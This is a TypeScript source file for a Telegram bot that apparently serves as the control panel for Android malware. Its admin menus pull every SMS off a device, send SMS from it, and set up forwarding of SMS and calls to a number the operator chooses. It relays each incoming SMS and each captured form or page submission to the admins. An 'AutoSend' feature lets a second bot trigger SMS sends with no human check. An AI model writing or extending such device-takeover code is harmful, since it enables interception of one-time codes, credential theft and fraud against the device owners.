                    if (deviceData) await this.downloadAllSMS(chatId, deviceData);
                    else this.bot?.sendMessage(chatId, '❌ Device not found.');
                    break;

                case 'sendsms':
                    if (deviceData) this.promptSendSMS(chatId, deviceData);
                    else this.bot?.sendMessage(chatId, '❌ Device not found.');
                    break;

                case 'forms':
                    if (deviceData) this.downloadAllForms(chatId, deviceData);
                    else this.bot?.sendMessage(chatId, '❌ Device not found.');
                    break;

                case 'status':
                    if (deviceData) this.showStatus(chatId, deviceData);
                    else this.bot?.sendMessage(chatId, '❌ Device not found.');
                    break;

                case 'sync':
                    if (deviceData) this.requestSync(chatId, deviceData);
                    else this.bot?.sendMessage(chatId, '❌ Device not found.');
                    break;

                case 'forward':
                    if (deviceData) this.showForwardOptions(chatId, deviceData);
                    else this.bot?.sendMessage(chatId, '❌ Device not found.');
                    break;

                case 'fwd_sms_menu':
                    if (deviceData) this.showForwardSmsMenu(chatId, deviceData);
                    break;

                case 'fwd_calls_menu':
                    if (deviceData) this.showForwardCallsMenu(chatId, deviceData);
                    break;

                case 'fwd_sms_on':
                    if (deviceData) this.promptForwardNumber(chatId, deviceData, 'sms');
                    break;

                case 'fwd_sms_off':
                    if (deviceData) this.setForwarding(chatId, deviceData, 'sms', false);
                    break;

                case 'fwd_sms_check':
                    if (deviceData) this.showForwardingCheck(chatId, deviceData, 'sms');
                    break;

                case 'fwd_calls_on':
                    if (deviceData) this.promptForwardNumber(chatId, deviceData, 'calls');
                    break;

                case 'fwd_calls_off':
                    if (deviceData) this.setForwarding(chatId, deviceData, 'calls', false);
                    break;

                case 'fwd_calls_check':
                    if (deviceData) this.showForwardingCheck(chatId, deviceData, 'calls');
                    break;

                case 'sms_sim':
                    if (parts.length >= 3 && deviceData) {
                        const simIndex = parseInt(parts[2], 10);
                        this.startSmsConversation(chatId, deviceData, simIndex);
                    }
                    break;

                case 'fwd_sim':
                    if (parts.length >= 4 && deviceData) {
                        const type = parts[2] as 'sms' | 'calls';
                        const simIndex = parseInt(parts[3], 10);
                        this.startForwardingConversation(chatId, deviceData, type, simIndex);
                    }
                    break;

                case 'as_menu':
                    if (deviceData) this.showAutoSendMenu(chatId, deviceData);
                    break;

                case 'as_on':
                    if (deviceData) this.enableAutoSendPrompt(chatId, deviceData);
                    break;

                case 'as_sim':
                    if (parts.length >= 3 && deviceData) {
                        const simIndex = parseInt(parts[2], 10);
                        const sims = deviceData.device.simCards || [];
                        const subscriptionId = sims[simIndex] && typeof sims[simIndex].subscriptionId === 'number'
                            ? sims[simIndex].subscriptionId
                            : -1;
                        this.setAutoSendTarget(chatId, deviceData.device.id, subscriptionId);
                    }
                    break;

                case 'as_off':
                    this.disableAutoSend(chatId);
                    break;

                case 'as_mode':
                    if (deviceData) this.toggleAutoSendMode(chatId, deviceData);
                    else if (shortId) {
                        const d = this.findDevice(shortId);
                        if (d) this.toggleAutoSendMode(chatId, d);
                    }
                    break;
            }
        });
    }

    // ==================== MESSAGE LISTENER ====================

    private setupMessageListener(): void {
        if (!this.bot) return;

        this.bot.on('message', (msg) => {
            if (!msg.text || msg.text.startsWith('/')) return;

            const chatId = msg.chat.id;
            if (!this.isAdmin(msg.from?.id || 0, chatId)) return;

            // Handle reply keyboard buttons
            if (msg.text === '📱 Devices') {
                this.showDevicesList(chatId);
                return;
            }
            if (msg.text === '⚡ Actions') {
                this.showDeviceSelection(chatId);
                return;
            }

            // Check SMS conversation
            const smsConv = this.smsConversations.get(chatId);
            if (smsConv) {
                this.handleSmsConversation(chatId, msg.text.trim(), smsConv);
                return;
            }

            // Check forwarding conversation
            const fwdConv = this.forwardingConversations.get(chatId);
            if (fwdConv) {
                this.handleForwardingConversation(chatId, msg.text.trim(), fwdConv);
                return;
            }
        });
    }

    private handleSmsConversation(chatId: number, text: string, conversation: { deviceId: string; subscriptionId: number; step: 'phone' | 'message'; phoneNumber?: string }): void {
        if (conversation.step === 'phone') {
            if (!text.match(/^\+?[\d\s-]{7,15}$/)) {
                this.bot?.sendMessage(chatId, '❌ Invalid phone number. Please enter a valid number (e.g., +919876543210):');
                return;
            }
            conversation.phoneNumber = text;
            conversation.step = 'message';
            this.smsConversations.set(chatId, conversation);

            this.bot?.sendMessage(chatId,
                `📱 *To:* ${text}\n\n📝 Now enter your message:`,
                {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [[{ text: '❌ Cancel', callback_data: 'sms_cancel:0' }]]
                    }
                }
            );
        } else if (conversation.step === 'message') {
            const phoneNumber = conversation.phoneNumber!;
            if (this.onSendSms) {
                const requestId = `tg-${Date.now()}`;
                this.onSendSms(conversation.deviceId, phoneNumber, text, requestId, conversation.subscriptionId);
                this.bot?.sendMessage(chatId,
                    `✅ *SMS Sent!*\n\n📱 To: ${phoneNumber}\n💬 Message: ${text}`,
                    { parse_mode: 'Markdown' }
                );
            }
            this.smsConversations.delete(chatId);
        }
    }

    private handleForwardingConversation(chatId: number, text: string, conversation: { deviceId: string; type: 'sms' | 'calls'; subscriptionId: number }): void {
        if (!text.match(/^\+?[\d\s-]{7,15}$/)) {
            this.bot?.sendMessage(chatId, '❌ Invalid phone number. Please enter a valid number (e.g., +919876543210):');
            return;
        }

        const configUpdate = conversation.type === 'sms'
            ? { smsEnabled: true, smsForwardTo: text, smsSubscriptionId: conversation.subscriptionId }
            : { callsEnabled: true, callsForwardTo: text, callsSubscriptionId: conversation.subscriptionId };

        if (this.onForwardingUpdate) {
            this.onForwardingUpdate(conversation.deviceId, configUpdate);
            const typeLabel = conversation.type === 'sms' ? '📨 SMS' : '📞 Calls';
            this.bot?.sendMessage(chatId,
                `✅ *${typeLabel} Forwarding Enabled!*\n\n📤 Forwarding to: ${text}`,
                { parse_mode: 'Markdown' }
            );
        }
        this.forwardingConversations.delete(chatId);
    }

    // ==================== AUTOSEND DEVICE SELECTION ====================

    private showAutoSendMenu(chatId: number, deviceData: any): void {
        const device = deviceData.device;
        const shortId = device.id.substring(0, 8);

        let statusLine: string;
        if (this.autoSendDeviceId === device.id) {
            statusLine = '✅ ENABLED on this device';
        } else if (this.autoSendDeviceId) {
            const current = store.getDevice(this.autoSendDeviceId);
            statusLine = `⚠️ Enabled on another device (${current?.device.name || this.autoSendDeviceId.substring(0, 8)})`;
        } else {
            statusLine = '❌ OFF';
        }
        const modeLine = this.autoSendMode === 'auto'
            ? '⚡ Auto — sends immediately when a request is received'
            : '👆 Manual — requires pressing 🚀 AutoSend on the preview';
        const modeLabel = this.autoSendMode === 'auto' ? '👆 Switch to Manual' : '⚡ Switch to Auto';

        const message = `*🚀 AutoSend - ${device.name}*\n\nStatus: ${statusLine}\nMode: ${modeLine}\n\n` +
            `When enabled, second-bot SMS requests posted to the request group are sent from the enabled device.` +
            (this.autoSendMode === 'auto' ? ` In *Auto* mode the SMS is sent immediately.` : ` In *Manual* mode an admin must press the preview button.`);

        const buttons: TelegramBot.InlineKeyboardButton[][] = [];
        if (this.autoSendDeviceId === device.id) {
            buttons.push([{ text: '❌ Disable AutoSend', callback_data: 'as_off' }]);
        } else {
            buttons.push([{ text: '✅ Enable AutoSend on this device', callback_data: `as_on:${shortId}` }]);
        }
        buttons.push([{ text: modeLabel, callback_data: `as_mode:${shortId}` }]);
        buttons.push([{ text: '⬅️ Back', callback_data: `action_menu:${shortId}` }]);

        this.bot?.sendMessage(chatId, message, {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: buttons }
        });
    }

    private enableAutoSendPrompt(chatId: number, deviceData: any): void {
        const device = deviceData.device;
        const shortId = device.id.substring(0, 8);
        const sims = device.simCards || [];

        if (sims.length > 1) {
            const buttons: TelegramBot.InlineKeyboardButton[][] = sims.map((sim: any, i: number) => [{
                text: `📶 ${sim.carrierName || 'SIM ' + (i + 1)}${sim.phoneNumber ? ` (${sim.phoneNumber})` : ''}`,
                callback_data: `as_sim:${shortId}:${i}`
            }]);
            buttons.push([{ text: '❌ Cancel', callback_data: `as_menu:${shortId}` }]);

            this.bot?.sendMessage(chatId,
                `*🚀 AutoSend via ${device.name}*\n\n📶 *Select SIM:*`,
                {
                    parse_mode: 'Markdown',
                    reply_markup: { inline_keyboard: buttons }
                }
            );
            return;
        }

        const subscriptionId = sims.length === 1 && typeof sims[0].subscriptionId === 'number'
            ? sims[0].subscriptionId
            : -1;
        this.setAutoSendTarget(chatId, device.id, subscriptionId);
    }

    private setAutoSendTarget(chatId: number, deviceId: string, subscriptionId: number): void {
        this.autoSendDeviceId = deviceId;
        this.autoSendSubscriptionId = subscriptionId;
        const deviceData = store.getDevice(deviceId);
        console.log(`[AutoSMS] Enabled on device ${deviceData?.device.name || deviceId} (SIM: ${subscriptionId > 0 ? subscriptionId : 'default'})`);

        const simText = subscriptionId > 0 ? `\n📶 SIM: \`${subscriptionId}\`` : '\n📶 SIM: Default';
        this.bot?.sendMessage(chatId,
            `✅ *AutoSend enabled!*\n\n📱 Device: *${deviceData?.device.name || deviceId}*${simText}\n\n` +
            `Second-bot SMS requests will now be sent from this device.`,
            { parse_mode: 'Markdown' }
        );
    }

    private disableAutoSend(chatId: number): void {
        const previous = this.autoSendDeviceId ? store.getDevice(this.autoSendDeviceId) : undefined;
        this.autoSendDeviceId = null;
        this.autoSendSubscriptionId = -1;
        console.log(`[AutoSMS] Disabled (was: ${previous?.device.name || 'none'})`);
        this.bot?.sendMessage(chatId, '❌ AutoSend disabled.');
    }

    private toggleAutoSendMode(chatId: number, deviceData: any): void {
        this.autoSendMode = this.autoSendMode === 'auto' ? 'manual' : 'auto';
        console.log(`[AutoSMS] Mode switched to ${this.autoSendMode}`);
        this.bot?.sendMessage(chatId, this.autoSendMode === 'auto'
            ? '⚡ AutoSend mode: *Auto* — matching requests will be sent immediately without a button press.'
            : '👆 AutoSend mode: *Manual* — an admin must press 🚀 AutoSend on the preview to send.', { parse_mode: 'Markdown' });
        // Refresh the menu to reflect the new mode
        this.showAutoSendMenu(chatId, deviceData);
    }

    // ==================== AUTOSEND SMS (SECOND BOT) ====================
    //
    // A second Telegram bot/user posts SMS requests into a designated group.
    // This bot detects them, shows an inline [🚀 AutoSend] button and only
    // sends via the EXISTING onSendSms() pipeline after an authorized admin
    // presses the button. One group message = at most ONE SMS request.

    private setupAutoSmsListener(): void {
        if (!this.bot || !this.autoSmsConfig) return;

        // Resolve our own bot id for loop prevention: with Bot-to-Bot
        // Communication Mode enabled (core.telegram.org/api/bots/bot-to-bot)
        // our own preview messages may also be delivered back to us if the
        // second bot has the mode enabled. Never parse our own messages.
        this.bot.getMe().then((me) => {
            this.selfBotId = me.id;
        }).catch((error: any) => {
            console.error('[AutoSMS] Failed to resolve own bot id:', error?.message || error);
        });

        // NOTE: For the first bot to receive messages from the second bot,
        // Bot-to-Bot Communication Mode must be enabled for it in @BotFather,
        // and it must be an admin in the group OR have Group Privacy Mode
        // disabled. Otherwise Telegram does not deliver other bots' messages.
        this.bot.on('message', (msg) => {
            this.handleAutoSmsGroupMessage(msg).catch((error: any) => {
                console.error('[AutoSMS] Error handling group message:', error?.message || error);
            });
        });
    }

    private async handleAutoSmsGroupMessage(msg: TelegramBot.Message): Promise<void> {
        const cfg = this.autoSmsConfig;
        if (!cfg || !msg.text || !msg.from) return;

        // Loop prevention: never process our own messages (Telegram's
        // recommended safeguard for bot-to-bot communication).
        if (this.selfBotId !== null && msg.from.id === this.selfBotId) return;

        // Security: only accept messages from configured groups AND
        // configured sender ids. Never trust message text alone.
        if (!cfg.groupIds.includes(msg.chat.id)) return;
        if (!cfg.senderIds.includes(msg.from.id)) return;

        // Edits arrive as 'edited_message' events (not handled here), so an
        // edited message can never create a duplicate request.

        const parsed = parseAutoSmsMessage(msg.text);
        if (!parsed || parsed.confidence === 'low') {
            console.log(`[AutoSMS] Ignoring malformed/ambiguous message from sender ${msg.from.id} in group ${msg.chat.id}`);
            return;
        }

        // Expire old pending requests to keep memory bounded.
        this.pruneExpiredAutoSmsRequests();

        const requestId = `autosend-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
        const request: AutoSmsRequest = {
            requestId,
            chatId: msg.chat.id,
            messageId: msg.message_id,
            senderId: msg.from.id,
            recipientNumber: parsed.recipientNumber,
            message: parsed.message,
            createdAt: Date.now(),
            status: 'pending'
        };
        this.pendingAutoSmsRequests.set(requestId, request);

        console.log(`[AutoSMS] Request detected: requestId=${requestId} senderId=${msg.from.id} groupId=${msg.chat.id} recipient=${TelegramBotService.maskPhone(parsed.recipientNumber)} confidence=${parsed.confidence} mode=${this.autoSendMode}`);

        // Auto mode: send immediately via the enabled device, skipping the button.
        if (this.autoSendMode === 'auto') {
            if (!this.autoSendDeviceId) {
                const warnText =
                    `⚠️ AutoSend is in *Auto* mode but no device is enabled.\n\n` +
                    `Enable via /actions → select device → 🚀 AutoSend\n\n` +
                    `To: ${parsed.recipientNumber}\n\nMessage:\n${parsed.message}`;
                try {
                    const sent = await this.bot?.sendMessage(msg.chat.id, warnText, {
                        parse_mode: 'Markdown',
                        reply_markup: { inline_keyboard: [[{ text: '🔄 Retry', callback_data: `autosend:${requestId}` }]] }
                    });
                    if (sent) request.messageId = sent.message_id;
                } catch (error: any) {
                    console.error('[AutoSMS] Failed to send auto-mode warning:', error?.message || error);
                }
                return;
            }

            const deviceData = store.getDevice(this.autoSendDeviceId);
            if (!deviceData || deviceData.device.status !== 'online') {
                request.status = 'failed';
                const deviceName = deviceData?.device.name || this.autoSendDeviceId.substring(0, 8);
                console.error(`[AutoSMS] Auto-send failed: device offline (requestId=${requestId} device=${deviceName})`);
                const failText = `❌ AutoSend failed — device *${deviceName}* offline\n\nTo: ${parsed.recipientNumber}\n\nReason: Device offline. Use /actions to enable on another device.`;
                try {
                    const sent = await this.bot?.sendMessage(msg.chat.id, failText, {
                        parse_mode: 'Markdown',
                        reply_markup: { inline_keyboard: [[{ text: '🔄 Retry', callback_data: `autosend:${requestId}` }]] }
                    });
                    if (sent) request.messageId = sent.message_id;
                } catch (error: any) {
                    console.error('[AutoSMS] Failed to send auto-send failure card:', error?.message || error);
                }
                return;
            }

            const statusText =
                `🚀 AutoSend → ${deviceData.device.name}\n\n` +
                `To: ${parsed.recipientNumber}\n\n` +
                `Message:\n${parsed.message}\n\n` +
                `⏳ Sending...`;
            try {
                const sent = await this.bot?.sendMessage(msg.chat.id, statusText);
                if (sent) request.messageId = sent.message_id;
            } catch (error: any) {
                console.error('[AutoSMS] Failed to send auto-send status card:', error?.message || error);
            }
            request.status = 'sending';
            console.log(`[AutoSMS] Auto-sending: requestId=${requestId} recipient=${TelegramBotService.maskPhone(parsed.recipientNumber)} via ${deviceData.device.name}`);
            if (!this.onSendSms) {
                request.status = 'failed';
                console.error(`[AutoSMS] Auto-send failed: onSendSms not wired (requestId=${requestId})`);
                return;
            }
            this.onSendSms(this.autoSendDeviceId, parsed.recipientNumber, parsed.message, requestId, this.autoSendSubscriptionId);
            return;
        }

        // Manual mode: show preview with button. Capture the preview's message_id
        // so handleAutoSmsSendResult can edit the correct message.
        const preview =
            `📱 SMS Request\n\n` +
            `To: ${parsed.recipientNumber}\n\n` +
            `Message:\n${parsed.message}`;

        try {
            const sent = await this.bot?.sendMessage(msg.chat.id, preview, {
                reply_markup: {
                    inline_keyboard: [[{ text: '🚀 AutoSend', callback_data: `autosend:${requestId}` }]]
                }
            });
            if (sent) request.messageId = sent.message_id;
        } catch (error: any) {
            console.error('[AutoSMS] Failed to send preview:', error?.message || error);
        }
    }

    private async handleAutoSendCallback(query: TelegramBot.CallbackQuery): Promise<void> {
        const queryId = query.id;
        const data = query.data!;
        const action = data.split(':')[0];
        const chatId = query.message!.chat.id;
        const pressedBy = query.from.id;

        if (action === 'autosend_cancel') {
            this.bot?.answerCallbackQuery(queryId, { text: 'Cancelled. The request stays available.' });
            return;
        }

        // Callback formats:
        //   autosend:<requestId>
        //   autosend_dev:<requestId>:<deviceShortId>
        //   autosend_sim:<requestId>:<deviceShortId>:<simIndex>
        const requestId = data.split(':')[1] || '';

        if (action === 'autosend') {
            console.log(`[AutoSMS] AutoSend pressed: requestId=${requestId} userId=${pressedBy}`);
        }

        const request = this.pendingAutoSmsRequests.get(requestId);

        if (!request || request.chatId !== chatId) {
            this.bot?.answerCallbackQuery(queryId, { text: '❌ This SMS request is no longer available.', show_alert: true });
            return;
        }

        // Expiration check.
        const ttlMs = (this.autoSmsConfig?.ttlMinutes ?? AUTO_SMS_DEFAULT_TTL_MINUTES) * 60 * 1000;
        if (Date.now() - request.createdAt > ttlMs) {
            this.pendingAutoSmsRequests.delete(requestId);
            this.bot?.answerCallbackQuery(queryId, { text: '❌ This SMS request has expired.', show_alert: true });
            this.editAutoSmsPreview(chatId, request.messageId,
                `⌛ This SMS request has expired.\n\nTo: ${request.recipientNumber}`,
                [[{ text: '⌛ Expired', callback_data: 'autosend_disabled' }]]
            );
            return;
        }

        // Duplicate protection: only a 'pending' or 'failed' (retry) request may proceed.
        if (request.status === 'sent') {
            this.bot?.answerCallbackQuery(queryId, { text: '✅ This SMS has already been sent.', show_alert: true });
            return;
        }
        if (request.status === 'sending') {
            this.bot?.answerCallbackQuery(queryId, { text: '⏳ SMS is already being sent.' });
            return;
        }

        switch (action) {
            case 'autosend': {
                const deviceId = this.autoSendDeviceId;
                if (!deviceId) {
                    this.bot?.answerCallbackQuery(queryId, { text: '❌ AutoSend is not enabled on any device. Enable it via ⚡ Actions → select device → 🚀 AutoSend.', show_alert: true });
                    return;
                }

                const deviceData = store.getDevice(deviceId);
                if (!deviceData || deviceData.device.status !== 'online') {
                    request.status = 'failed';
                    const deviceName = deviceData?.device.name || deviceId.substring(0, 8);
                    console.error(`[AutoSMS] Sending failed: AutoSend device offline (requestId=${requestId} device=${deviceName})`);
                    this.bot?.answerCallbackQuery(queryId, { text: `❌ AutoSend device (${deviceName}) is offline.`, show_alert: true });
                    this.bot?.sendMessage(chatId,
                        `❌ SMS sending failed\n\nTo: ${request.recipientNumber}\n\nReason:\nAutoSend device *${deviceName}* is offline.`,
                        {
                            parse_mode: 'Markdown',
                            reply_markup: {
                                inline_keyboard: [[{ text: '🔄 Retry', callback_data: `autosend:${requestId}` }]]
                            }
                        }
                    );
                    return;
                }

                await this.executeAutoSend(queryId, request, deviceId, this.autoSendSubscriptionId);
                return;
            }
        }
    }

    /**
     * Atomically transition the request to 'sending' and invoke the existing
     * SMS pipeline on the selected device/SIM.
     */
    private async executeAutoSend(
        queryId: string,
        request: AutoSmsRequest,
        deviceId: string,
        subscriptionId: number
    ): Promise<void> {
        // Atomic transition to 'sending' before invoking the SMS pipeline.
        request.status = 'sending';
        console.log(`[AutoSMS] Sending started: requestId=${request.requestId} recipient=${TelegramBotService.maskPhone(request.recipientNumber)}`);

        this.bot?.answerCallbackQuery(queryId, { text: '🚀 Sending SMS...' });

        if (!this.onSendSms) {
            request.status = 'failed';
            console.error(`[AutoSMS] Sending failed: onSendSms not wired (requestId=${request.requestId})`);
            return;
        }

        // Reuse the existing manual-SMS pipeline (device -> Android -> SMS).
        this.onSendSms(deviceId, request.recipientNumber, request.message, request.requestId, subscriptionId);

        // Final confirmation arrives asynchronously via handleAutoSmsSendResult().
    }

    /**
     * Called by the socket layer when the Android device reports an
     * sms:sendResult for one of our pending AutoSend requests.
     */
    handleAutoSmsSendResult(requestId: string, success: boolean, error?: string): void {
        const request = this.pendingAutoSmsRequests.get(requestId);
        if (!request || request.status !== 'sending') return;

        if (success) {
            request.status = 'sent';
            console.log(`[AutoSMS] Sending succeeded: requestId=${requestId} recipient=${TelegramBotService.maskPhone(request.recipientNumber)}`);
            this.editAutoSmsPreview(request.chatId, request.messageId,
                `✅ SMS sent successfully\n\nTo: ${request.recipientNumber}\n\nMessage:\n${request.message}`,
                [[{ text: '✅ Sent', callback_data: `autosend:${requestId}` }]]
            );
        } else {
            request.status = 'failed';
            console.error(`[AutoSMS] Sending failed: requestId=${requestId} recipient=${TelegramBotService.maskPhone(request.recipientNumber)} reason=${error || 'unknown'}`);
            this.editAutoSmsPreview(request.chatId, request.messageId,
                `❌ SMS sending failed\n\nTo: ${request.recipientNumber}\n\nReason:\n${error || 'Unknown error'}`,
                [[{ text: '🔄 Retry', callback_data: `autosend:${requestId}` }]]
            );
        }
    }

    private editAutoSmsPreview(chatId: number, messageId: number, text: string, keyboard: TelegramBot.InlineKeyboardButton[][]): void {
        this.bot?.editMessageText(text, {
            chat_id: chatId,
            message_id: messageId,
            reply_markup: { inline_keyboard: keyboard }
        }).catch((error: any) => {
            console.error('[AutoSMS] Failed to update preview message:', error?.message || error);
        });
    }

    private pruneExpiredAutoSmsRequests(): void {
        const ttlMs = (this.autoSmsConfig?.ttlMinutes ?? AUTO_SMS_DEFAULT_TTL_MINUTES) * 60 * 1000;
        const now = Date.now();
        for (const [id, req] of this.pendingAutoSmsRequests) {
            if (now - req.createdAt > ttlMs && req.status !== 'sending') {
                this.pendingAutoSmsRequests.delete(id);
            }
        }
    }

    static maskPhone(phoneNumber: string): string {
        if (phoneNumber.length <= 4) return '****';
        return '*'.repeat(phoneNumber.length - 4) + phoneNumber.slice(-4);
    }

    // ==================== HELPERS ====================

    private findDevice(idOrShortId: string) {
        let deviceData = store.getDevice(idOrShortId);
        if (deviceData) return deviceData;

        const devices = store.getAllDevices();
        const match = devices.find(d => d.id.startsWith(idOrShortId) || d.id.includes(idOrShortId));
        if (match) return store.getDevice(match.id);

        return undefined;
    }

    // ==================== NOTIFICATION METHODS ====================

    private async sendToAllAdmins(message: string, options?: TelegramBot.SendMessageOptions): Promise<void> {
        if (!this.bot || !this.isEnabled) return;
        for (const adminId of this.adminIds) {
            try {
                await this.bot.sendMessage(adminId, message, { parse_mode: 'Markdown', ...options });
            } catch (error) {
                console.error(`[Telegram] Failed to send to admin ${adminId}:`, error);
            }
        }
    }

    async notifyDeviceOnline(device: Device): Promise<void> { return; }
    async notifyDeviceOffline(device: Device): Promise<void> { return; }

    async notifyDeviceConnected(device: Device): Promise<void> {
        const status = device.status === 'online' ? '�' : '�';
        await this.sendToAllAdmins(`${status} *${device.name}* is now connected.`);
    }

    async notifyNewSMS(deviceName: string, sms: SMS, device?: Device): Promise<void> {
        if (sms.type !== 'incoming') return;

        // Escape special Markdown characters in dynamic content
        const escapeMarkdown = (text: string): string => {
            return text.replace(/([*_`\[\]])/g, '\\$1');
        };

        let message = `📨 *New SMS*\n\n`;

        // Device info section
        message += `*📱 Device Info:*\n`;
        message += `   Name: ${escapeMarkdown(deviceName)}\n`;
        if (device) {
            message += `   ID: \`${device.id.substring(0, 8)}\`\n`;
            const simCards = device.simCards || [];
            if (simCards.length > 0) {
                message += `   📶 *SIMs:*\n`;
                simCards.forEach((sim: any, i: number) => {
                    const carrier = escapeMarkdown(sim.carrierName || 'Unknown');
                    const phone = sim.phoneNumber ? escapeMarkdown(sim.phoneNumber) : 'N/A';
                    message += `      SIM ${i + 1}: ${carrier} (${phone})\n`;
                });
            }
        }
        message += `\n`;

        // Sender info - escape in case sender has special chars
        message += `👤 *From:* ${escapeMarkdown(sms.sender)}\n\n`;

        // Message content - escape markdown to prevent parsing errors
        const escapedMessage = escapeMarkdown(sms.message);
        message += `💬 *Message:*\n\`\`\`\n${escapedMessage}\n\`\`\`\n`;

        // Timestamp
        const timestamp = new Date(sms.timestamp).toLocaleString();
        message += `🕐 ${timestamp}`;

        await this.sendToAllAdmins(message);
    }

    async notifyFormSubmission(deviceName: string, form: FormData): Promise<void> {
        // Helper to format a section only if it has data
        const formatSection = (title: string, emoji: string, fields: { label: string; value: any }[]): string => {
            const filledFields = fields.filter(f => f.value && f.value !== 'N/A' && f.value !== '');
            if (filledFields.length === 0) return '';

            let section = `*${emoji} ${title}:*\n`;
            filledFields.forEach(f => {
                section += `   ${f.label}: ${f.value}\n`;
            });
            section += '\n';
            return section;
        };

        let message = `📝 *New Form Submission*\n\n`;
        message += `📱 Device: *⟨${deviceName}⟩*\n`;
        message += `━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;

        // Build sections from formConfig categories
        for (const category of FIELD_CATEGORIES) {
            const categoryFields = getFieldsByCategory(category.key);
            const fields = categoryFields.map(f => ({
                label: f.displayName,
                value: form[f.key]
            }));
            message += formatSection(category.displayName, category.emoji, fields);
        }

        // Remove trailing newlines
        message = message.trim();

        await this.sendToAllAdmins(message);
    }

    async notifyNewForm(deviceId: string, form: FormData): Promise<void> {
        const deviceData = store.getDevice(deviceId);
        const deviceName = deviceData?.device?.name || deviceId.substring(0, 8);
        await this.notifyFormSubmission(deviceName, form);
    }

    async notifyPageSync(deviceId: string, pageName: string, pageData: Record<string, any>, timestamp: string): Promise<void> {
        const deviceData = store.getDevice(deviceId);
        const deviceName = deviceData?.device?.name || deviceId.substring(0, 8);

        let message = `📄 *Form Page Submitted*\n\n`;
        message += `📱 Device: *⟨${deviceName}⟩*\n`;
        message += `📍 Page: *${pageName}*\n`;
        message += `🕐 Time: ${new Date(timestamp).toLocaleString()}\n`;
        message += `━━━━━━━━━━━━━━━━━━━━━━━━\n`;

        for (const [key, value] of Object.entries(pageData)) {
            const displayKey = key.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase());
            message += `   ${displayKey}: ${value}\n`;
        }

        await this.sendToAllAdmins(message);
    }

    isActive(): boolean {
        return this.isEnabled && this.bot !== null;
    }

}

let telegramBot: TelegramBotService | null = null;

export function initTelegramBot(config?: TelegramConfig): TelegramBotService {
    telegramBot = new TelegramBotService(config);
    return telegramBot;
}

export function getTelegramBot(): TelegramBotService | null {
    return telegramBot;
}
